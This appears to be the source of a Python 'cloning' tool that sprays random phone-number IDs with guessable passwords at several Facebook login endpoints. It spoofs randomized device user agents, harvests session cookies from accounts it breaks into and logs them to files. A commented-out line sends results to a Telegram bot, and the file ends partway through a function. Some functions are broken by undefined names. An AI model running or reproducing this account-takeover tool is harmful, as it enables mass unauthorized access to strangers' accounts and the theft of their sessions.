#WRITTEN B2Y MR.DIPTO
#FOLLOW : https://github.com/MR-DIPTO-404
#------------- import -------------#
import os
from os import system as clr
import random
import string 
from concurrent.futures import ThreadPoolExecutor as tred
import requests
import re
import sys
import uuid
import json
import bs4
import time
from time import time as KontolMemekSiaAnjingKontolAsuMemekBagong
from bs4 import BeautifulSoup as bxx
ses = requests.Session()
#-------------color----------------#
bblack="\033[1;30m"         # Black
M="\033[1;31m"            # Red
H="\033[1;32m"         # Green
byellow="\033[1;33m"        # Yellow
bblue="\033[1;34m"          # Blue
P="\033[1;35m"        # Purple
C="\033[1;36m"          # Cyan
B="\033[1;37m"         # White
my_color = [
 B,C,P,H]
warna = random.choice(my_color)
oks=[]
cps=[]
ugen = []
ugent = []
loop=0
meta = []
def tahunng(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		elif fx[:5] in ['10009']           :tahunz = '2023'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz

for i in range(10000):
      rr = random.randint
      rc = random.choice
      #andro = f"{(rr(4,13))}"
      andro = random.choice([str(random.randint(4,7))+'.'+str(random.randint(0,5))+'.'+str(random.randint(0,9)),'7','6','8.0.0','8.1.0','8','9','10','11','12','13'])
      archi = random.choice(['armeabi-v7a:armeabi','arm64-v8a:','arm64-v8a:null','x86:armeabi-v7a','arm64-v8a:armeabi-v7a:armeabi'])
      net=random.choice(["MTN-Stay Safe","MTN-STAY SAFE","MTN NG","null","Airtel NG","","Glo NG"])
      brd=rc(["TP1A","OPM2","RKQ1","SP1A","PKQ1","TQ1A","QP1A","RP1A","TKQ1","PPR1","PKQ1","OPM1"])
      build=str(rc(brd))+"."+str(rr(170000,250000))+".0"+str(rr(0,6))+str(rr(0,6))
      fbav = f'{random.randint(300,450)}.0.0.{random.randint(11,99)}.{random.randint(111,399)}'
      fbbv = str(random.randint(351111111,409999999))
      fbrv = str(random.randint(351111111,409999999))
      moto = random.choice(['moto 360','moto 360 (2nd gen)','moto a1680','moto c','moto c plus','moto defy xt','moto e','moto e (1st gen)','moto e (2nd gen)','moto e (4)','moto e (4) plus','moto e (5)','moto e (google edition)','moto e with 4g lte (2nd gen)','moto e13','moto e2','moto e20','moto e22','moto e22i','moto e22s','moto e3','moto e3 power','moto e30','moto e32','moto e4','moto e4 plus','moto e40','moto e5','moto e5 cruise','moto e5 go','moto e5 play','moto e5 plus','moto e5 supra','moto e6','moto e6 play','moto e6 plus','moto e6i','moto e6s','moto e7','moto e7 plus','moto e7 power','moto e7i power','moto g','moto g (1st gen)','moto g (2014)','moto g (2nd gen)','moto g (3rd gen)','moto g (4)','moto g (4) play','moto g (4) plus','moto g (5)','moto g (5) plus','moto g (5g)','moto g (5s)','moto g (5s) plus','moto g (5th gen)','moto g (google edition)','moto g 5g plus','moto g fast','moto g go','moto g play','moto g play (2021)','moto g play (2023)','moto g plus (5th gen)','moto g power','moto g power (2021)','moto g power (2022)','moto g power (2023)','moto g pro','moto g pure','moto g stylus','moto g stylus (2021)','moto g stylus (2022)','moto g stylus (2022) (5g)','moto g stylus (5g)','moto g turbo edition','moto g with 4g lte (1st gen)','moto g with 4g lte (2nd gen)','moto g10','moto g10 power','moto g100 (5g)','moto g13','moto g2','moto g20','moto g200 (5g)','moto g22','moto g23','moto g30','moto g31','moto g32','moto g4','moto g4 plus','moto g40 fusion','moto g41','moto g42','moto g5','moto g5 plus','moto g50 (5g)','moto g51','moto g51 (5g)','moto g52','moto g52j (5g)','moto g53 (5g)','moto g5s','moto g5s plus','moto g6','moto g6 forge','moto g6 play','moto g6 plus','moto g60','moto g62 (5g)','moto g7','moto g7 optimo','moto g7 play','moto g7 plus','moto g7 power','moto g7 supra','moto g71 (5g)','moto g72','moto g73','moto g8','moto g8 play','moto g8 plus','moto g8 power','moto g8 power lite','moto g82 (5g)','moto g9','moto g9 play','moto g9 plus','moto g9 power','moto glam','moto green pomelo','moto m','moto m dual','moto maxx','moto me525','moto mt620','moto mt716','moto mt810','moto mt870','moto one Vision','moto p30','moto p30 Note','moto p30 play','moto tab g62','moto tab g70','moto x','moto x (2014)','moto x (2nd gen)','moto x (4)','moto x (google edition)','moto x force','moto x play','moto x pro (china)','moto x pure edition','moto x style','moto x5'])
      sasm = random.choice(["E025F", "G996B", "A826S", "E135F", "G781B", "G998B", "F936U1", "G361F", "A716S", "J327AZ", "E426B", "A015F", "A015M", "A013G", "A013G", "A013M", "A013F", "A022M", "A022G", "A022F", "A025M", "S124DL", "A025U", "A025A", "A025G", "A025F", "A025AZ", "A035F", "A035M", "A035G", "A032F", "A032M", "A032F", "A037F", "A037U", "A037M", "S134DL", "A037G", "A105G", "A105M", "A105F", "A105FN", "A102U", "S102DL", "A102U1", "A107F", "A107M", "A115AZ", "A115U", "A115U1", "A115A", "A115M", "A115F", "A125F", "A127F", "A125M", "A125U", "A127M", "A135F", "A137F", "A135M", "A136U", "A136U1", "A136W", "A260F", "A260G", "A260F", "A260G", "A205GN", "A205U", "A205F", "A205G", "A205FN", "A202F", "A2070", "A207F", "A207M", "A215U", "A215U1", "A217F", "A217F", "A217M", "A225F", "A225M", "A226B", "A226B", "A226BR", "A235F", "A235M", "A300FU", "A300F", "A300H", "A310F", "A310M", "A320FL", "A320F", "A305G", "A305GT", "A305N", "A305F", "A307FN", "A307G", "A307GN", "A315G", "A315F", "A325F", "A325M", "A326U", "A326W", "A336E", "A336B", "A430F", "A405FN", "A405FM", "A3051", "A3050", "A415F", "A426U", "A426B", "A5009", "A500YZ", "A500Y", "A500W", "A500L", "A500X", "A500XZ", "A510F", "A510Y", "A520F", "A520W", "A500F", "A500FU", "A500H", "S506DL", "A505G", "A505FN", "A505U", "A505GN", "A505F", "A507FN", "A5070", "A515F", "A515U", "A515U1", "A516U", "A516V", "A516N", "A516B", "A525F", "A525M", "A526U", "A526U1", "A526B", "A526W", "A528B", "A536B", "A536U", "A536E", "A536V", "A600FN", "A600G", "A605FN", "A605G", "A605GN", "A605F", "A6050", "A606Y", "A6060", "G6200", "A700FD", "A700F", "A7000", "A700H", "A700YD", "A710F", "A710M", "A720F", "A750F", "A750FN", "A750GN", "A705FN", "A705F", "A705MN", "A707F", "A715F", "A715W", "A716U", "A716V", "A716U1", "A716B", "A725F", "A725M", "A736B", "A530F", "A810YZ", "A810F", "A810S", "A530W", "A530N", "G885F", "G885Y", "G885S", "A730F", "A805F", "G887F", "G8870", "A9000", "A920F", "A920F", "G887N", "A910F", "G8850", "A908B", "A908N", "A9080", "G313HY", "G313MY", "G313MU", "G316M", "G316ML", "G316MY", "G313HZ", "G313H", "G313HU", "G313U", "G318H", "G357FZ", "G310HN", "G357FZ", "G850F", "G850M", "J337AZ", "G386T1", "G386T", "G3858", "G3858", "A226L", "C5000", "C500X", "C5010", "C5018", "C7000", "C7010", "C701F", "C7018", "C7100", "C7108", "C9000", "C900F", "C900Y", "G355H", "G355M", "G3589W", "G386W", "G386F", "G3518", "G3586V", "G5108Q", "G5108", "G3568V", "G350E", "G350", "G3509I", "G3508J", "G3502I", "G3502C", "S820L", "G360H", "G360F", "G360T", "G360M", "G361H", "E500H", "E500F", "E500M", "E5000", "E500YZ", "E700H", "E700F", "E7009", "E700M", "G3815", "G3815", "G3815", "F127G", "E225F", "E236B", "F415F", "E5260", "E625F", "F900U", "F907N", "F900F", "F9000", "F907B", "F900W", "G150NL", "G155S", "G1650", "W2015", "G7102", "G7105", "G7106", "G7108", "G7202", "G720N0", "G7200", "G720AX", "G530T1", "G530H", "G530FZ", "G531H", "G530BT", "G532F", "G531BT", "G531M", "J727AZ", "J100FN", "J100H", "J120FN", "J120H", "J120F", "J120M", "J111M", "J111F", "J110H", "J110G", "J110F", "J110M", "J105H", "J105Y", "J105B", "J106H", "J106F", "J106B", "J106M", "J200F", "J200M", "J200G", "J200H", "J200F", "J200GU", "J260M", "J260F", "J260MU", "J260F", "J260G", "J200BT", "G532G", "G532M", "G532MT", "J250M", "J250F", "J210F", "J260AZ", "J3109", "J320A", "J320G", "J320F", "J320H", "J320FN", "J330G", "J330F", "J330FN", "J337V", "J337P", "J337A", "J337VPP", "J337R4", "J327VPP", "J327V", "J327P", "J327R4", "S327VL", "S337TL", "S367VL", "J327A", "J327T1", "J327T", "J3110", "J3119S", "J3119", "S320VL", "J337T", "J400M", "J400F", "J400F", "J410F", "J410G", "J410F", "J415FN", "J415F", "J415G", "J415GN", "J415N", "J500FN", "J500M", "J510MN", "J510FN", "J510GN", "J530Y", "J530F", "J530G", "J530FM", "G570M", "G570F", "G570Y", "J600G", "J600FN", "J600GT", "J600F", "J610F", "J610G", "J610FN", "J710F", "J700H", "J700M", "J700F", "J700P", "J700T", "J710GN", "J700T1", "J727A", "J727R4", "J737T", "J737A", "J737R4", "J737V", "J737T1", "J737S", "J737P", "J737VPP", "J701F", "J701M", "J701MT", "S767VL", "S757BL", "J720F", "J720M", "G615F", "G615FU", "G610F", "G610M", "G610Y", "G611MT", "G611FF", "G611M", "J730G", "J730GM", "J730F", "J730FM", "S727VL", "S737TL", "J727T1", "J727T1", "J727V", "J727P", "J727VPP", "J727T", "C710F", "J810M", "J810F", "J810G", "J810Y", "A605K", "A605K", "A202K", "M336K", "A326K", "C115", "C115L", "C1158", "C1158", "C115W", "C115M", "S120VL", "M015G", "M015F", "M013F", "M017F", "M022G", "M022F", "M022M", "M025F", "M105G", "M105M", "M105F", "M107F", "M115F", "M115F", "M127F", "M127G", "M135M", "M135F", "M135FU", "M205FN", "M205F", "M205G", "M215F", "M215G", "M225FV", "M236B", "M236Q", "M305F", "M305M", "M307F", "M307FN", "M315F", "M317F", "M325FV", "M325F", "M326B", "M336B", "M336BU", "M405F", "M426B", "M515F", "M526BR", "M526B", "M536B", "M625F", "G750H", "G7508Q", "G7509", "N970U", "N970F", "N971N", "N970U1", "N770F", "N975U1", "N975U", "N975F", "N975F", "N976N", "N980F", "N981U", "N981B", "N985F", "N9860", "N986N", "N986U", "N986B", "N986W", "N9008V", "N9006", "N900A", "N9005", "N900W8", "N900", "N9009", "N900P", "N9000Q", "N9002", "9005", "N750L", "N7505", "N750", "N7502", "N910F", "N910V", "N910C", "N910U", "N910H", "N9108V", "N9100", "N915FY", "N9150", "N915T", "N915G", "N915A", "N915F", "N915S", "N915D", "N915W8", "N916S", "N916K", "N916L", "N916LSK", "N920L", "N920S", "N920G", "N920A", "N920C", "N920V", "N920I", "N920K", "N9208", "N930F", "N9300", "N930x", "N930P", "N930X", "N930W8", "N930V", "N930T", "N950U", "N950F", "N950N", "N960U", "N960F", "N960U", "N935F", "N935K", "N935S", "G550T", "G550FY", "G5500", "G5510", "G550T1", "S550TL", "G5520", "G5528", "G600FY", "G600F", "G6000", "G6100", "G610S", "G611F", "G611L", "G110M", "G110H", "G110B", "G910S", "G316HU", "G977N", "G973U1", "G973F", "G973W", "G973U", "G770U1", "G770F", "G975F", "G975U", "G970U", "G970U1", "G970F", "G970N", "G980F", "G981U", "G981N", "G981B", "G780G", "G780F", "G781W", "G781U", "G7810", "G9880", "G988B", "G988U", "G988B", "G988U1", "G985F", "G986U", "G986B", "G986W", "G986U1", "G991U", "G991B", "G990B", "G990E", "G990U", "G998U", "G996W", "G996U", "G996N", "G9960", "S901U", "S901B", "S908U", "S908U1", "S908B", "S9080", "S908N", "S908E", "S906U", "S906E", "S906N", "S906B", "S906U1", "G730V", "G730A", "G730W8", "C105L", "C101", "C105", "C105K", "C105S", "G900F", "G900P", "G900H", "G9006V", "G900M", "G900V", "G870W", "G890A", "G870A", "G900FD", "G860P", "G901F", "G901F", "G800F", "G800H", "G903F", "G903W", "G920F", "G920K", "G920I", "G920A", "G920P", "G920S", "G920V", "G920T", "G925F", "G925A", "G925W8", "G928F", "G928C", "G9280", "G9287", "G928T", "G928I", "G930A", "G930F", "G930W8", "G930S", "G930V", "G930P", "G930L", "G891A", "G935F", "G935T", "G935W8", "G9350", "G950F", "G950W", "G950U", "G892A", "G892U", "G8750", "G955F", "G955U", "G955U1", "G955W", "G955N", "G960U", "G960U1", "G960F", "G965U", "G965F", "G965U1", "G965N", "G9650", "J321AZ", "J326AZ", "J336AZ", "T116", "T116NU", "T116NY", "T116NQ", "T2519", "G318HZ", "T255S", "W2016", "W2018", "W2019", "W2021", "W2022", "G600S", "E426S", "G3812", "G3812B", "G3818", "G388F", "G389F", "G390F", "G398FN",])
      ura = f"Dalvik/2.1.0 (Linux; U; Android {andro}; V2043_21 Build/{build}) [FBAN/MessengerLite;FBAV/{(rr(100,467))}.0.0.5.119;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/{(rr(100000000,9000000000))};FBCR/{net};FBMF/vivo;FBBD/vivo;FBDV/V2043_21;FBSV/{andro};FBCA/{archi};FBDM/"+"{density=2.25,height=,width=};]"
      uc = f"Dalvik/2.1.0 (Linux; U; Android {andro}; {moto} Build/S1SRS32.38-132-8) [FBAN/MessengerLite;FBAV/{(rr(100,467))}.0.0.7.131;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/543901789;FBCR/;FBMF/motorola;FBBD/motorola;FBDV/{moto};FBSV/{andro};FBCA/arm64-v8a:{archi};FBDM/"+"{density=2.25,height=1024,width=2048};]"
      ud = f"Dalvik/2.1.0 (Linux; U; Android {andro}; SM-{sasm} Build/{build}) [FBAN/MessengerLite;FBAV/{(rr(100,467))}.0.0.3.109;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/{(rr(100000000,9000000000))};FBCR/{net};FBMF/samsung;FBBD/samsung;FBDV/SM-{sasm};FBSV/{andro};FBCA/{archi};FBDM/"+"{density=2.25,height=,width=};]"
      um = f"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(random.randint(100,114))}.0.0.0 Mobile Safari/537.36"
      free = str(rr(1601,1999))
      uv = f"Dalvik/2.1.0 (Linux; U; Android {andro}; vivo {free} [FBAN/MessengerLite;FBAV/{str(rr(100,437))}.0.0.{str(rr(3,9))}.{str(rr(50,250))};FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/616331435;FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo {free} ;FBSV/{andro};FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/"+"{density=2.25,height=2048,width=2048};]"
      uvl = f"[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};FBDM/"+"{density=2.75,width=1080,height=2225}"+";FBLC/en_GB;FBRV/{fbrv};FBCR/{net};FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/V{str(random.randint(1710,2090))};FBSV/{str(random.randint(9,13))};FBOP/1;FBCA/{archi};]"
      ##memek = f"Dalvik/2.1.0 (Linux; U; Android {andro}; vivo V3Max Build/LMY47V) [FBAN/Orca-Android;FBAV/{(rr(100,467))}.0.0.16.158;FBPN/com.facebook.orca;FBLC/en_US;FBBV/{(rr(100000000,9000000000))};FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/{andro};FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=3.0,width=1080,height=1920"
      ua = random.choice([ura, uc, ud, um, uv, uvl,])
      ugen.append(ua)
      

#-------------logo-----------------#
logo=(f'''{B}

╔═╗╦ ╦╔╗ ╔═╗╦═╗  ╔═╗╔═╗╔╗╔╔═╗╦═╗╔═╗╦    
║  ╚╦╝╠╩╗║╣ ╠╦╝  ║ ╦║╣ ║║║║╣ ╠╦╝╠═╣║    
╚═╝ ╩ ╚═╝╚═╝╩╚═  ╚═╝╚═╝╝╚╝╚═╝╩╚═╩ ╩╩═╝  

{warna}--------------------------------------------{B}
 Owner    : {C}CYBER GENERAL {B}
 Guthub   : CYBER GENERAL 
 Facebook : ********
 Tools    :  PAID
--------------------------------------------{B}''')




#-------------linex def -------------#
def linex():
    print(f'{warna}--------------------------------------------{B}')
#-------------clear def -------------#
def clear():
    clr('clear')
    print(logo)
#-------------main def------------#
def DEMON():
    clear()
    #os.system('xdg-open https://github.com/davidkumar45')
    print(f'{B} [{warna}01{B}] RANDOM CLONING ')
    print(f'{B} [{warna}00{B}] EXIT TERMINAL ')
    linex()
    option=input(f' {B}[{warna}??{B}] CHOICE MENU >> ')
    if option in ['01','1']:
        NIJA_CLONING()
    else:
        exit(' Thanks for using dear :)')
#------------- bd clone def ----------#
def NIJA_CLONING():
    user=[]
    clear()
    linex()
    print(' \x1b[1;96m CHOOSE METHOD ')
    print(' 1.\x1b[1;91m API METHOD ')
    print(' 2.\x1b[1;92m GRAPH METHOD ')
    print(' 3.\x1b[1;93m VALIDATE METHOD ')
    print(' 4.\x1b[1;94m REGULAR METHOD ')
    print(' 5.\x1b[1;95m ASYNC METHOD ')
    method=input(' \x1b[1;97m   ENTER METHOD> >> : ')
    if method in ["1","01"]:
    	meta = method_crack
    elif method in ["2","02"]:
    	meta = api
    elif method in ["3","03"]:
    	meta = val
    elif method in ["4","04"]:
    	meta = reg
    elif method in ["5","05"]:
    	meta = asynkk
    linex()
    print(' EXAMPLE SIM CODE : [080] [070] [090] [081]')
    code=input(' ENTER SIM CODE >> ')
    linex()
    print(' EXAMPLE LIMIT : [1000] [2000] [5000] [10000] [50000]')
    try:
        limit=int(input(' ENTER LIMIT >> '))
    except ValueError:
        limit=100000
    clear()
    for nmbr in range(limit):
        nmp=''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with tred(max_workers=30) as Dipto:
        tl=str(len(user))
        print(' TOTAL ACCOUNT : '+tl)
        print(' YOUR SIM CODE : '+code)
        print(' PROGRESS HAS BEEN RUNNING PLEASE WAIT ')
        linex()
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:8],ids[:7],ids[:6],ids[5:],ids[4:],'123456','12345678','1234567']
            Dipto.submit(meta,ids,passlist)
    linex()
    print(' THE PROGRESS HAS BEEN COMPLETE ')
    print(' TOTAL OK ID '+str(len(oks)))
    print(' TOTAL CP ID '+str(len(cps)))
    input(' PRESS ENTER TO BACK  : ')
    DEMON()
#------------ method crack def ---------#
def method_crack(ids,passlist):
    global oks
    global cps
    global loop
    try:
        for pas in passlist:
            sys.stdout.write('\r\r \033[1;37m[Progress] %s|\033[1;32mSucces:%s'%(loop,len(oks)))
            sys.stdout.flush()
            ua = random.choice(ugen)
            adid=str(uuid.uuid4())
            device_id=str(uuid.uuid4())
            datax={'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
            header={'User-Agent': ua, 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': '21435', 'X-FB-Net-HNI': '35793', 'X-FB-SIM-HNI': '37855', 'X-FB-Connection-Type': 'WIFI', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
            url='https://api.facebook.com/method/auth.login'
            reqx=requests.post(url,data=datax,headers=header).json()
            if 'session_key' in reqx:
                try:
                    uid=reqx['uid']
                except:
                    uid=ids
                chkk = lock_check(uid)
                if chkk == 'LOCK':
                    break
                else:
                	##print('\033[1;32m [ACCOUNT YEAR] '+tahunng((str(uid))))
                    print('\r\r \033[1;32m[GENERAL-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                    print('\033[1;32m [COOKIES] '+coki)
                    print('\033[1;32m [USERAGENT] '+ua)
                    ##requests.post(f"https://api.telegram.org/bot5801819480:AAGPf7_L3g-aCBMswPmWnRVZqpRgCth-ssY/sendMessage?chat_id=1977098006&text= OK dark.py RESULT \n ====================\n ( )\n.√. USER   (  {ids}   {uid} )\n.√. PASSWORD  (  {pas}  )\n ====================\n.√. USERAGENT   (  {ua}  )\n.√. By :- CYBER GENERAL √ " )
                    open('/sdcard/GENERAL-OK.txt','a').write(str(uid)+' | '+pas+'\n')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in reqx['error_msg']:
                print('\r\r \033[1;30m[GENERAL-CP] '+ids+' | '+pas+'\033[1;37m')
                open('/sdcard/DEMON-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        loop+=1
        #pass

       
def api(ids,passlist):
    global oks
    global cps
    global loop
    try:
        for pas in passlist:
            sys.stdout.write('\r\r \033[1;37m[ API Progress] %s|\033[1;32mSucces:%s'%(loop,len(oks)))
            sys.stdout.flush()
            ua = random.choice(ugen)
            data = {"access_token": "438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28", "sdk_version": {random.randint(1,26)}, "email": ids, "locale": "en_GB", "password": pas, "sdk": "android", "generate_session_cookies": "1", "sig": "4f648f21fb58fcd2aa1c65f35f441ef5"}
            head = {"Host": "graph.facebook.com", "x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)), "x-fb-sim-hni": str(random.randint(20000, 40000)),"x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
            reqx = ses.post("https://graph.facebook.com/auth/login", params=data, headers=head, allow_redirects=False).json()
            if 'session_key' in reqx:
                try:
                    uid=reqx['uid']
                except:
                    uid=ids
                if str(uid) in oks:
                    break
                else:
                    print('\r\r \033[1;32m[GENERAL-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                    sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    uk = base64.b64encode(os.urandom(35)).decode().replace("=","").replace("+","_").replace("/","-")
                    cokie = ";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                    coki = f"sb={sb};{cokie};m_pixel_ratio=1.25;dpr=1.25;wd=448x931;ua={uk}"
                    print('\033[1;32m [COOKIES] '+coki)
                    print('\033[1;32m [USERAGENT] '+ua)
                    open('/sdcard/GENERAL-OK.txt','a').write(str(uid)+' | '+pas+'\n')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in reqx['error_msg']:
                print('\r\r \033[1;30m[GENERAL-CP] '+ids+' | '+pas+'\033[1;37m')
                open('/sdcard/GENERAL-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
            	
def val(ids,passlist):
    global oks
    global cps
    global loop
    try:
        for pas in passlist:
            sys.stdout.write('\r\r \033[1;37m[ Validate Progress] %s|\033[1;32mSucces:%s'%(loop,len(oks)))
            sys.stdout.flush()
            ses = requests.Session()
            ua = random.choice(ugen)
            link = ses.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
            data = {
            "lsd":re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
            "uid":ids,
            "next":"https://mbasic.facebook.com/login/save-device/",
            "flow":"login_no_pin",
            "pass":pas,
            }
            headers = {
    'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-GB,en;q=0.9',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=3mT9ZMjszJIfiG4hHnwtlLnl; sb=3mT9ZDbN5-BsUKKToJWE5bBm',
    'dpr': '2',
    'referer': 'https://www.google.com/',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"Infinix X669"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"12.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'cross-site',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
    'viewport-width': '980',
}
            reqx = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0", data=data, headers=head, allow_redirects=False)
            r = reqx.json()
          ##  if "c_user" in ses.cookies.get_dict() or 'session_key' in r:
            if "c_user" in ses.cookies.get_dict():
                try:
                    uid=r['uid']
                except:
                    uid=ids
                if str(uid) in oks:
                    break
                else:
                    print('\r\r \033[1;32m[GENERAL-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                    cooz = ses.cookies.get_dict()
                    coki = "datr=" + cooz["datr"] + ";" + ("sb=" + cooz["sb"]) + ";" + "locale=en_GB" + ";" + ("c_user=" + cooz["c_user"]) + ";" + ("xs=" + cooz["xs"]) + ";" + ("fr=" + cooz["fr"]) + ";"
                    print('\033[1;32m [COOKIES] '+coki)
                    print('\033[1;32m [USERAGENT] '+ua)
                    open('/sdcard/GENERAL-OK.txt','a').write(str(uid)+' | '+pas+'\n')
                    oks.append(str(uid))
                    break
            elif "checkpoint" in ses.cookies.get_dict():
                print('\r\r \033[1;30m[GENERAL-CP] '+ids+' | '+pas+'\033[1;37m')
                open('/sdcard/GENERAL-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
            
def reg(ids,passlist):
    global oks
    global cps
    global loop
    try:
        for pas in passlist:
            sys.stdout.write('\r\r \033[1;37m[ Regular Progress] %s|\033[1;32mSucces:%s'%(loop,len(oks)))
            sys.stdout.flush()
            ses = requests.Session()
            ua = random.choice(ugen)
            link = ses.get("https://b-m.facebook.com/login.php?next=https%3A%2F%2Fb-m.facebook.com%2Fhome.php%3Frefid%3D8&refsrc=deprecated&refid=8&_rdr")
            data ={"lsd": re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
			"jazoest": re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
			"uid": ids,
			"pass":pas,
			"flow": "login_no_pin",
			"enable_bladerunner": False,
			"enable_ack": True,
			"enable_observer": False,
			"enable_dataloss_timer": False,
			"enable_fallback_for_br": True,
			"fix_br_init_rc": False,
			"queue_activation_experiment": True,
			"prefer_related_applications": False, 
			"encpass": f"#PWD_BROWSER:0:{random.randint(1000000000, 99999999999)}:{password}"}
            headers = {
    'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-GB,en;q=0.9',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=3mT9ZMjszJIfiG4hHnwtlLnl; sb=3mT9ZDbN5-BsUKKToJWE5bBm',
    'dpr': '2',
    'referer': 'https://www.google.com/',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"Infinix X669"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"12.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'cross-site',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
    'viewport-width': '980',
}
            reqx = ses.post('https://b-m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=en_GB', data=data, headers=head, allow_redirects=False)
            r = reqx.json()
            if "c_user" in ses.cookies.get_dict():
                try:
                    uid=r['uid']
                except:
                    uid=ids
                if str(uid) in oks:
                    break
                else:
                    print('\r\r \033[1;32m[GENERAL-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                    cooz = ses.cookies.get_dict()
